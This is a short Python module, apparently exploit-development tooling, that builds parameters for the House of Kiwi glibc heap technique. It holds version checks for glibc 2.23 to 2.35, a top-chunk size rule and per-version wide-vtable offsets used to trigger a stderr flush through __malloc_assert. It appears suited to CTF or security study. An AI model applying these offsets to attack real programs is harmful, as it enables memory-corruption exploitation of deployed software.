"""House of Kiwi old malloc_assert -> stderr flush trigger plan."""
from dataclasses import dataclass
@dataclass(frozen=True)
class KiwiPlan:
    version: str
    top_size: int
    wide_vtable_offset: int

def build_house_of_kiwi(*, version: str, top_size: int = 0x21) -> KiwiPlan:
    """生成 Kiwi 触发器参数；2.23～2.35 才会经 `__malloc_assert` 刷新 stderr。"""
    if version not in {f"2.{i}" for i in range(23, 36)}: raise ValueError("Kiwi supports glibc 2.23 through 2.35")
    offset = 0x130 if version <= "2.29" else 0xF0 if version == "2.30" else 0xE0
    if top_size < 0x20 or top_size & 0xF != 1: raise ValueError("top_size must be aligned with PREV_INUSE")
    return KiwiPlan(version, top_size, offset)
